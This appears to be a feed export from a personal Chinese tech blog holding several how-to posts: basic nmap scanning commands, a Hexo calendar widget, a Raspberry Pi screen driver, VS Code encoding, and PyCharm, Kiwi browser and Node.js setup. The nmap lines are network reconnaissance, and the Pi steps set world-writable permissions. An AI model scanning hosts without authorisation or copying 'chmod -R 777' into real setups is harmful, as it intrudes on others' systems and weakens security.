<p>扫描前不进行Ping扫描测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -Pn &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p>如果有一个ip地址列表，将这个保存为一个txt文件，和nmap在同意目录下，扫描这个txt的所有主机，命令为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>
<p>版本检测扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/12/mzHTuabVEJFo2Av.png" alt=""></p>
<p>Nmap的帮助文档<br><img src="https://i.loli.net/2021/05/12/eRQIHwjkcuvAtoZ.png" alt=""><br><img src="https://i.loli.net/2021/05/12/8FSLDtPyUIGlXo6.png" alt=""></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://blog.csdn.net/aspirationflow/article/details/7694274">Nmap扫描原理与用法</a></p>
]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>Hack</tag>
        <tag>Namp</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo next主题添加日历云</title>
    <url>/article/2797960d.html</url>
    <content><![CDATA[<h1 id="hexo-next主题添加日历云"><a href="#hexo-next主题添加日历云" class="headerlink" title="hexo next主题添加日历云"></a>hexo next主题添加日历云</h1><a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文使用theme-next-calendar插件实现日历云模块,具体效果点击链接查看</p>
<p><a href="#" class="LinkCard"></a></p>
<p>theme-next-calendar插件官方文档</p>
<p><a href="https://github.com/icecory/theme-next-calendar" class="LinkCard">官方文档</a></p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="1-安装theme-next-calendar插件"><a href="#1-安装theme-next-calendar插件" class="headerlink" title="1.安装theme-next-calendar插件"></a>1.安装theme-next-calendar插件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save git:&#x2F;&#x2F;github.com&#x2F;icecory&#x2F;theme-next-calendar#hexo</span><br></pre></td></tr></table></figure>
<h3 id="2-下载相关文件"><a href="#2-下载相关文件" class="headerlink" title="2.下载相关文件"></a>2.下载相关文件</h3><p>注意:按照官方文档中的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone --depth&#x3D;1 git@github.com&#x2F;icecory&#x2F;theme-next-calendar themes&#x2F;next&#x2F;source&#x2F;lib&#x2F;calendar</span><br></pre></td></tr></table></figure>
<p>我的git显示没有此仓库,可以直接去下载压缩包</p>
<p><a href="https://github.com/icecory/theme-next-calendar" class="LinkCard">下载压缩包</a></p>
<p>趁着下载,找到如下目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">themes&#x2F;next&#x2F;source&#x2F;lib&#x2F;</span><br></pre></td></tr></table></figure>
<p>在该目录下新建文件夹,名字为calendar.</p>
<p>下载完毕后解压,把里面的文件直接复制到calendar文件夹,如下图</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210408124812513.png" alt=""></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>按照官方文档给出方法,我失败了,下面是官方给出的方法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">步骤一:</span><br><span class="line">把sidebar.swig, calendar.styl放到$&#123;root&#125;&#x2F;source&#x2F;_data目录下,在themes&#x2F;next&#x2F;layout&#x2F;_layout.swig最后加入下面代码</span><br><span class="line">&#123;% include &#39;..&#x2F;source&#x2F;lib&#x2F;calendar&#x2F;calendar.swig&#39; %&#125;</span><br><span class="line">步骤二:</span><br><span class="line">在next主题配置文件_config.yml配置</span><br><span class="line">custom_file_path:</span><br><span class="line">  sidebar: source&#x2F;_data&#x2F;sidebar.swig</span><br><span class="line">  styles: source&#x2F;_data&#x2F;calendar.styl</span><br><span class="line"></span><br><span class="line">CloudCalendar:</span><br><span class="line">  enable: true</span><br><span class="line">  language: zh-CN</span><br><span class="line">  single: true</span><br><span class="line">  root: &#x2F;calendar&#x2F;</span><br></pre></td></tr></table></figure>
<p>我的方法:</p>
<p>依据上述步骤二中的在next主题配置文件_config.yml中配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">custom_file_path:</span><br><span class="line">  sidebar: source&#x2F;_data&#x2F;sidebar.swig</span><br><span class="line">  styles: source&#x2F;_data&#x2F;calendar.styl</span><br></pre></td></tr></table></figure>
<p>我发现我的之前已经配置过了</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210408125818914.png" alt=""></p>
<p>所以我不打算使用官方的步骤一,由上图看出我的style已经启用,然后我将calendar.styl中的代码直接复制到source/_data/styles.styl中._</p>
<p>依据官方文档,在themes/next/layout/_layout.swig最后加入下面代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% include &#39;..&#x2F;source&#x2F;lib&#x2F;calendar&#x2F;calendar.swig&#39; %&#125;</span><br></pre></td></tr></table></figure>
<p>我发现仍然失败,我直接将calendar.swig文件复制到themes/next/layout目录下</p>
<p>然后在themes/next/layout/_layout.swig最后加入下面代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% include &#39;calendar.swig&#39; %&#125;</span><br></pre></td></tr></table></figure>
<p>接下来在next主题配置文件最后加入下面代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CloudCalendar:</span><br><span class="line">  enable: true</span><br><span class="line">  language: zh-CN #设置语言</span><br><span class="line">  single: true</span><br><span class="line">  root: &#x2F;calendar&#x2F;</span><br></pre></td></tr></table></figure>
<p>最后,在你想添加日历云的位置添加下面代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- CloudCalendar --&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;widget-wrap&quot; style&#x3D;&quot;width: 90%;margin-left: auto;margin-right: auto; opacity: 0.97;&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;widget&quot; id&#x3D;&quot;CloudCalendar&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>关于树莓派3.5寸屏的安装使用与切换至电脑屏</title>
    <url>/article/6f07e0d8.html</url>
    <content><![CDATA[<h1 id="关于树莓派3-5寸屏的安装使用与切换至电脑屏"><a href="#关于树莓派3-5寸屏的安装使用与切换至电脑屏" class="headerlink" title="关于树莓派3.5寸屏的安装使用与切换至电脑屏"></a>关于树莓派3.5寸屏的安装使用与切换至电脑屏</h1><a id="more"></a>
<p>到手的树莓派迫于三无（无显示屏，无网线，无键盘）条件限制只能采用电脑ssh连接，奈何又蹭别人家WiFi，树莓派IP地址可为难死我了（树莓派IP地址是动态的），最后入手一个极为便宜的3.5寸屏（便宜故没安装驱动，屏幕就一直白屏，开始我不知道），这又花费我大量时间安装驱动，驱动安装后又发现电脑远程连接时屏幕也是3.5寸（我好不容易调好的远程界面又没了），因此写下此文祭奠我为折腾树莓派而逝去的光阴。（便于以后查找）<br>关于如何查询树莓派IP地址，请看<a href="https://blog.csdn.net/wongnoubo/article/details/79628313">链接</a><br>关于如何ssh连接树莓派，请看<a href="https://baijiahao.baidu.com/s?id=1606207693709103859&amp;wfr=spider&amp;for=pc">链接</a><br>想要驱动的评论区留言<br>开始正题，关于驱动的安装，不再赘述</p>
<h2 id="一：安装驱动"><a href="#一：安装驱动" class="headerlink" title="一：安装驱动"></a>一：安装驱动</h2><p>以我这个为例</p>
<ol>
<li>把LCD-show-sky.zip解压之后,通过文件传输工具发送到树莓派系统中</li>
<li>获取驱动文件所有权限<br>进入树莓派系统，打开终端，输入指令: sudo chmod -R 777 LCD-show-sky</li>
<li>切换到驱动路径: cd LCD-show-sky</li>
<li>安装驱动: sudo ./LCD35a1-show</li>
</ol>
<p>注意:安装之后，树莓派会自动重启，3.5寸屏成功点亮。</p>
<h2 id="二：屏幕校准"><a href="#二：屏幕校准" class="headerlink" title="二：屏幕校准"></a>二：屏幕校准</h2><h3 id="1-设置参数"><a href="#1-设置参数" class="headerlink" title="1.设置参数"></a>1.设置参数</h3><ol>
<li><p>打开终端输入指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;X11&#x2F;xorg.conf.d&#x2F;99-calibration.conf</span><br></pre></td></tr></table></figure></li>
<li><p>修改参数</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210404170554294.png" alt=""></p>
</li>
<li><p>保存退出:Ctrl+O   —-&gt;  Enter   —-&gt;   ESC    —-&gt;   Ctrl+X</p>
</li>
</ol>
<h3 id="2-重启树莓派"><a href="#2-重启树莓派" class="headerlink" title="2.重启树莓派"></a>2.重启树莓派</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
<h2 id="三：3-5寸屏切换至电脑"><a href="#三：3-5寸屏切换至电脑" class="headerlink" title="三：3.5寸屏切换至电脑"></a>三：3.5寸屏切换至电脑</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd LCD-dhow-sky</span><br><span class="line">sudo .&#x2F;LCD-hdmi</span><br></pre></td></tr></table></figure>
<p>备注：此文仅为记录本人经历，方便以后查看</p>
]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>如何解决vscode中文乱码问题</title>
    <url>/article/2349ecf7.html</url>
    <content><![CDATA[<h1 id="如何解决vscode中文乱码问题"><a href="#如何解决vscode中文乱码问题" class="headerlink" title="如何解决vscode中文乱码问题"></a>如何解决vscode中文乱码问题</h1><a id="more"></a>
<p>最近，我在使用vscode编写运行python代码时出现vscode文件名乱码问题，如下图<br><img src="https://img-blog.csdnimg.cn/20200426130143928.png" alt=""><br>作为一个挑剔的人，我怎么能容忍好不容易配置好的vscode出现瑕疵，为此我查遍教程，却始终无法解决，（不过最终解决了）在此我将我尝试过的方法列举出来。</p>
<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>1.点击齿轮图标<br><img src="https://img-blog.csdnimg.cn/20200426130929646.png" alt=""><br>出现下图，点击设置（settings）（我汉化过了，想汉化的点）<br><img src="https://img-blog.csdnimg.cn/20200426131040678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>出现下图，在搜索栏搜索encoding，<br><img src="https://img-blog.csdnimg.cn/20200426131245921.png" alt=""><br>出现下图，勾选出下方选项即可<br><img src="https://img-blog.csdnimg.cn/20200426131409903.png" alt=""></p>
<h2 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h2><p>点击红框图标<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200426131625419.png" alt=""><br>在搜索框键入GBKtoUTF8<br><img src="https://img-blog.csdnimg.cn/20200426131705516.png" alt=""><br>出现下图，点击安装（install），关闭重启<br><img src="https://img-blog.csdnimg.cn/20200426131840976.png" alt=""></p>
<h2 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h2><p>此方法解决了我的问题<br>在代码前加下面代码即可（这个是python）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br></pre></td></tr></table></figure>
<p>或者下面方法<br>打开设置（你应该知道怎么打开）<br>点击箭头所指<br><img src="https://img-blog.csdnimg.cn/20200428173546526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>出现下图（就是这个文件）<br><img src="https://img-blog.csdnimg.cn/20200428173607520.png" alt=""><br>接下来在这个文件后添加下面代码即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;terminal.integrated.shellArgs.windows&quot;</span>: [<span class="string">&quot;-NoExit&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;chcp 65001&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>（注意记得在这行代码之前的代码末尾加上逗号）</p>
]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>pycharm的安装汉化及配置</title>
    <url>/article/236db6f0.html</url>
    <content><![CDATA[<h1 id="pycharm的安装汉化及配置"><a href="#pycharm的安装汉化及配置" class="headerlink" title="pycharm的安装汉化及配置"></a>pycharm的安装汉化及配置</h1><a id="more"></a>
<p>最近在自学python，所谓“工欲善其事，必先利其器”，所以就来介绍一下pycharm安装及相关环境配置。话不多说，直接入题。</p>
<h2 id="一：pycharm2020安装"><a href="#一：pycharm2020安装" class="headerlink" title="一：pycharm2020安装"></a>一：pycharm2020安装</h2><p>下面给出<a href="https://www.jetbrains.com/pycharm/download/#section=windows" class="LinkCard">官网链接</a></p>
<p>选择（我的是Windows系统）Windows下的Community（红框标出），关于两种（Professional和Community）的区别请看<a href="https://blog.csdn.net/moshangduanchang/article/details/105714705">链接</a>（都为同一家族），在这就不赘述了。点击<strong>Download</strong>开始下载</p>
<p><img src="https://img-blog.csdnimg.cn/20200424094356869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击后会出现下图，不用管它，下载时间有点长<br><img src="https://img-blog.csdnimg.cn/20200424095052636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>下载完成后，找到它在的文件夹，双击运行出现下图，点击“<strong>是</strong>”</p>
<p><img src="https://img-blog.csdnimg.cn/20200424095816280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击后出现下图，点击<strong>Next</strong><br><img src="https://img-blog.csdnimg.cn/20200424100029527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>因为我之前安装过2019版，出现下图，注意要把下图的两个选项勾选上（关于这两个选项详情请看<a href="https://blog.csdn.net/moshangduanchang/article/details/105714705">链接</a>）<br><img src="https://img-blog.csdnimg.cn/20200424100148897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击<strong>Next</strong>出现下图（注意：如果选择自己想安装的位置，一定要记住）<br><img src="https://img-blog.csdnimg.cn/20200424100749480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击<strong>Next</strong>，出现下图（按图勾选），点击<strong>Next</strong><br><img src="https://img-blog.csdnimg.cn/20200424101040967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击Next出现下图，再点击<strong>Install</strong><br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424101216830.png" alt=""><br>等待片刻<br><img src="https://img-blog.csdnimg.cn/2020042410123421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>勾选后点击<strong>Finish</strong><br><img src="https://gitee.com/wxpgitee/images/raw/master/2020042410143588.png" alt=""></p>
<h2 id="二：pycharm创建项目"><a href="#二：pycharm创建项目" class="headerlink" title="二：pycharm创建项目"></a>二：pycharm创建项目</h2><p>点击<strong>File-&gt;New project</strong><br><img src="https://img-blog.csdnimg.cn/20200424143119672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>出现以下界面<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424143423555.png" alt=""><br>点击<strong>CREATE</strong>即可创建</p>
<h2 id="三：pycharm汉化"><a href="#三：pycharm汉化" class="headerlink" title="三：pycharm汉化"></a>三：pycharm汉化</h2><p>1.下载汉化包（这里就不给出了，在网上一搜就可以找到）</p>
<p>2.打开你安装pycharm的文件夹（上文提到过），<br><img src="https://img-blog.csdnimg.cn/20200424105907135.png" alt=""></p>
<p>3.点击<strong>Pycharm Community Edition 2020.1</strong>，出现下图<br><img src="https://img-blog.csdnimg.cn/20200424110001548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""></p>
<p>4.将下载的汉化包<strong>resources_cn</strong>放到安装目录下的“<strong>lib</strong>”文件夹中（上图），删除原来的<strong>resources_en</strong>英文版文件（下图）（文件很多，慢慢找）<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424110213567.png" alt=""><br><strong><em>温馨提示：建议不要汉化，因为汉化后可能出现一些小问题</em></strong></p>
<h2 id="四：pycharm安装第三方库及插件"><a href="#四：pycharm安装第三方库及插件" class="headerlink" title="四：pycharm安装第三方库及插件"></a>四：pycharm安装第三方库及插件</h2><p><strong>1.库安装</strong><br>编写代码时，你可能遇到这种情形，代码打完了，运行时却提示:<strong>ModuleNotFoundError:No module named ‘……’</strong>,这时你就需要安装相应的库了<br>方法1：可在终端安装，点击<strong>Terminal</strong>终端<br><img src="https://img-blog.csdnimg.cn/20200424113438172.png" alt=""><br>在终端中键入<code>pip install &lt;你缺少的库的名字&gt;</code>(实际运用时没有尖括号’&lt;&gt;’,不知道库名的可以从报错信息中找)<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200424140929119.png" alt=""><br>方法2：点击<strong>File-&gt;settings</strong>(或者快捷键Ctrl+Alt+S)<br><img src="https://img-blog.csdnimg.cn/20200424114052625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>进入以下界面，按顺序点击（第一项可能不同，关键找到<strong>Python Interpreter</strong>）<br><img src="https://img-blog.csdnimg.cn/20200424114644668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>进入以下界面，点击右侧<strong>加号</strong>（红框）<br><img src="https://img-blog.csdnimg.cn/20200424114942949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>进入以下界面，在搜索栏键入库名，选中该库，点击下方的<strong>INSTALL PACKAGE</strong>即可</p>
<h2 id="五：安利一些好用的插件"><a href="#五：安利一些好用的插件" class="headerlink" title="五：安利一些好用的插件"></a>五：安利一些好用的插件</h2><h3 id="1-Material-Theme-UI"><a href="#1-Material-Theme-UI" class="headerlink" title="1.Material Theme UI"></a>1.Material Theme UI</h3><p><img src="https://img-blog.csdnimg.cn/20200424131701776.png" alt=""><br>可以自行更换主题，让你的pycharm更炫酷</p>
<h3 id="2-activate-power-mode"><a href="#2-activate-power-mode" class="headerlink" title="2.activate-power-mode"></a>2.activate-power-mode</h3><p><img src="https://img-blog.csdnimg.cn/20200424131523520.png" alt=""><br>有了这个，打代码成了一种享受，打代码时有炫酷特效（原谅我截不了动图）<br><img src="https://img-blog.csdnimg.cn/20200424132533846.png" alt=""></p>
<h3 id="3-CodeGlance"><a href="#3-CodeGlance" class="headerlink" title="3.CodeGlance"></a>3.CodeGlance</h3><p><img src="https://img-blog.csdnimg.cn/20200424132715670.png" alt=""><br>使用后将一个代码小地图嵌入到编辑器窗格中。使用自定义颜色进行语法高亮，同时使用明暗主题。（截不了动图，反正就是好用）<br><img src="https://img-blog.csdnimg.cn/20200424134214293.png" alt=""></p>
<h3 id="4-Rainbow-Brackets"><a href="#4-Rainbow-Brackets" class="headerlink" title="4.Rainbow Brackets"></a>4.Rainbow Brackets</h3><p><img src="https://img-blog.csdnimg.cn/20200424135043517.png" alt=""><br>可以让你的代码块颜色高亮，且支持多种编程语言</p>
<h3 id="5-Translate"><a href="#5-Translate" class="headerlink" title="5.Translate"></a>5.Translate</h3><p><img src="https://img-blog.csdnimg.cn/2020042413511462.png" alt=""><br>从名字就可看出什么作用，只需鼠标右击出现下图<br><img src="https://img-blog.csdnimg.cn/20200424135600593.png" alt=""><br>点击Translate（或快捷键Ctrl+Shift+Y）</p>
<p>备注：本文仅为记载我在安装过程遇到的问题，希望对大家有帮助，可以节约大家找教程的时间。（有些部分觉得别人写的很好，故给出链接，请到别人的博客学习）</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pycharm</tag>
      </tags>
  </entry>
  <entry>
    <title>手机浏览器如何像PC端一样安装插件（拓展程序）？</title>
    <url>/article/bc368736.html</url>
    <content><![CDATA[<h1 id="手机浏览器如何像PC端一样安装插件（拓展程序）？"><a href="#手机浏览器如何像PC端一样安装插件（拓展程序）？" class="headerlink" title="手机浏览器如何像PC端一样安装插件（拓展程序）？"></a>手机浏览器如何像PC端一样安装插件（拓展程序）？</h1><a id="more"></a>
<p>实际上，手机Google浏览器根本不能像PC端Google安装插件（是不是很想吐槽PC版端那么强，手机端却那么废），事实就是这样，手机端Google局限很大，既然无法满足我的需求，那我只能（卸载它）另寻他路了（其实如果你并不执着于安装插件使用更为强大的功能，手机Google还是OK的）。那我就分享一下我的解决方法。<br>手机Google无法安装插件，那我就换其他的浏览器，下面开始推送时间（我可不是推销，确实解决了问题），我向大家安利的是kiwi浏览器（可能你找不到下载的地方，给出链接）<br>链接: <a href="https://pan.baidu.com/s/1mRL_VfP6ke5wctqpocTANg " class="LinkCard">点击下载</a></p>
<p>提取码: pqvs<br>这款浏览器长这样<br><img src="https://img-blog.csdnimg.cn/20200604184818518.png" alt=""><br>安装后还不能直接安装插件（你应该打不开Google应用商店去下载插件，当然我可以，不过就不在这里给出了，如果确实需要，可以私信我）<br>下载的插件是以.crx结尾的文件<br>然后打开kiwi浏览器，点击右上角的三个点（如下图）<br><img src="https://gitee.com/wxpgitee/images/raw/master/20200604190151543.png" alt=""><br>点击下图所标<br><img src="https://img-blog.csdnimg.cn/20200604190517833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>打开开发者模式，点击Load，找到下载的插件（.crx结尾的文件）并选择即可<br><img src="https://img-blog.csdnimg.cn/20200604190641445.png" alt=""><br>接下来可能出现一些选项同意即可<br>结束<br>备注：本文仅供本人记录解决问题的方法</p>
]]></content>
      <categories>
        <category>无处安放</category>
      </categories>
  </entry>
  <entry>
    <title>如何在Windows系统安装node.js</title>
    <url>/article/fb9e1d9c.html</url>
    <content><![CDATA[<h1 id="如何在Windows系统安装node-js"><a href="#如何在Windows系统安装node-js" class="headerlink" title="如何在Windows系统安装node.js"></a>如何在Windows系统安装node.js</h1><a id="more"></a>
<p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。 Node.js 使用了一个事件驱动、非阻塞式 I/O 的模型。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。 发布于2009年5月，由Ryan Dahl开发，实质是对Chrome V8引擎进行了封装。Node对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好。V8引擎执行Javascript的速度非常快，性能非常好。 Node是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用<br>最近要用到node.js,说实话，不会安装，自己鼓捣一段时间，终于搞定，现在记录下过程，方便自己以后查看，同时希望对和我有同样问题有所帮助。</p>
<p>给出下载的<a href="https://nodejs.org/en/">官方网站</a>，页面如下</p>
<p><img src="https://img-blog.csdnimg.cn/20200427120309485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>（是不是懵了，全是英文，嘿嘿，我也是）令我意外的是，我的浏览器竟然无法使用翻译插件，别急，注意到右上角有个翻译图标吗（看下面）<br><img src="https://img-blog.csdnimg.cn/20200427120647459.png" alt=""><br>点击图标，选择中文简体即可<br><img src="https://img-blog.csdnimg.cn/20200427120728616.png" alt=""><br>翻译后为下图<br><img src="https://img-blog.csdnimg.cn/20200427120822246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>选择长期支持版（注意这个是Windows64位的，其他的点击下方的“其它下载”）<br><img src="https://img-blog.csdnimg.cn/20200427121522877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>之后出现下图<br><img src="https://img-blog.csdnimg.cn/20200427121602766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""></p>
<p>选择适合自己的版本下载，下载后如下图<br><img src="https://gitee.com/wxpgitee/images/raw/master/2020042712092893.png" alt=""><br>双击运行<br><img src="https://img-blog.csdnimg.cn/20200427120954524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击next出现下图<br><img src="https://img-blog.csdnimg.cn/20200427121014107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>勾选上图箭头所指，点击next出现下图<br><img src="https://img-blog.csdnimg.cn/20200427121126104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>选择安装位置，点击next出现下图<br><img src="https://img-blog.csdnimg.cn/20200427121732867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""><br>点击next（忘记截图了，有个选项，我勾选了）<br>最后，安装完成的图<br><img src="https://img-blog.csdnimg.cn/20200427122544804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2hhbmdkdWFuY2hhbmc=,size_16,color_FFFFFF,t_70" alt=""></p>
]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>如何打包python程序（.py至.exe）并添加图标的问题</title>
    <url>/article/ef5250b0.html</url>
    <content><![CDATA[<h1 id="如何打包python程序（-py至-exe）并添加图标的问题"><a href="#如何打包python程序（-py至-exe）并添加图标的问题" class="headerlink" title="如何打包python程序（.py至.exe）并添加图标的问题"></a>如何打包python程序（.py至.exe）并添加图标的问题</h1><a id="more"></a>
